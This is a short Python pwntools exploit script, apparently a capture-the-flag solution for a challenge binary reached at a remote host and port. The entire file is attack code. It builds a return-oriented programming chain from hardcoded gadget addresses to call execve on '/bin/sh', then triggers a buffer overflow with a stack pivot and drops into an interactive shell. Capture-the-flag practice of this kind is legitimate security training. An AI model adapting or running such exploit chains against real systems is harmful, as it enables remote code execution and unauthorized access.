#!/usr/bin/python3
from pwn import *
from six.moves import reload_module

if __name__=='__main__':
  #io = process('./chall')
  io = remote('gc1.eng.run',30775)
  L_pop_rdx = 0x00401237
  L_pop_rdi = 0x00401423
  L_syscall = 0x00401239
  L_pop_rax = 0x00401231
  L_pop_rsi = 0x00401235
  L_pop_rsp_r13_r14_r15 = 0x0040141d
  L_leave_ret = 0x004012a8
  L_ROP = flat([
    0,
    L_pop_rdi, 0x4040f0,
    L_pop_rsi, 0,
    L_pop_rdx, 0,
    L_pop_rax, 0x3b,
    L_syscall, b"/bin/sh\0"
  ],arch='amd64')
  io.sendline(L_ROP)
  io.sendlineafter(b'> ',b'A'*0x20 + p64(0x4040A0) + p64(L_leave_ret))
  io.interactive()